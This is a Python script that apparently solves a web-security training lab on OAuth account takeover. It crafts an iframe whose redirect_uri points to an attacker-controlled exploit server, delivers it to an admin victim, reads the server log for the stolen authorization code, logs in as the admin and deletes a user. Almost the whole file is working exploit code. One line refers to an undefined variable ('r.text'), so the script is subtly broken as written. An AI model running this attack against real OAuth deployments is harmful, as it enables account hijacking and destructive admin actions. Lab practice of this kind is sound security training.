import requests
import re
import time

LAB = "https://<lab-url>.web-security-academy.net"
OAUTH = "https://oauth-<oauth-id>.oauth-server.net"
EXPLOIT = "https://exploit-<exploit-id>.exploit-server.net"

session_1 = requests.Session()

# Step 1: Extract client_id from the lab's OAuth login link
# The client_id is found in the meta refresh tag on the /my-account page
response_1 = session_1.get(f"{LAB}/my-account")

client_id = re.search(r'client_id=([a-zA-Z0-9]+)', r.text).group(1)

print(f"Found client_id: {client_id}")

# Step 2: Craft the malicious iframe
# When loaded by the victim, it will initiate an OAuth flow
# with redirect_uri pointing to our exploit server

iframe_payload = (
    f'<iframe src="{OAUTH}/auth?client_id={client_id}'
    f'&redirect_uri={EXPLOIT}'
    f'&response_type=code'
    f'&scope=openid%20profile%20email"></iframe>'
)

# Step 3: Store the exploit on the exploit server
session_1.post(f"{EXPLOIT}", data={
    "urlIs498": "/exploit",
    "responseFile": "/exploit",
    "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8",
    "responseBody": iframe_payload,
    "formAction": "STORE"
})

# Step 4: Deliver the exploit to the victim (admin)
session_1.post(f"{EXPLOIT}", data={
    "urlIs498": "/exploit",
    "responseFile": "/exploit",
    "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8",
    "responseBody": iframe_payload,
    "formAction": "DELIVER_TO_VICTIM"
})

# Step 5: Wait for the victim to trigger the exploit
time.sleep(3)

# Step 6: Read the exploit server logs to extract the stolen code
response_2 = session_1.get(f"{EXPLOIT}/log")

stolen_code = re.search(r"code=([A-Za-z0-9_-]+)", response_2.text)

if not stolen_code:
    print("Failed to steal code")
    exit(1)

stolen_code = stolen_code.group(1)

print(f"Stolen authorization code: {stolen_code}")

# We create a new session (session_2) because we need a clean session context
# The first session (session_1) was used for exploit server interactions and contains
# cookies/state from the exploit server, not the target application
session_2 = requests.Session()

# Step 7: Use the stolen code to log in as admin
session_2.get(f"{LAB}/oauth-callback?code={stolen_code}", allow_redirects=True)

# Step 8: Access admin panel and delete carlos
response_3 = session_2.get(f"{LAB}/admin/delete?username=carlos")
print("Carlos deleted" if response_3.status_code == 200 else "Failed to delete carlos")
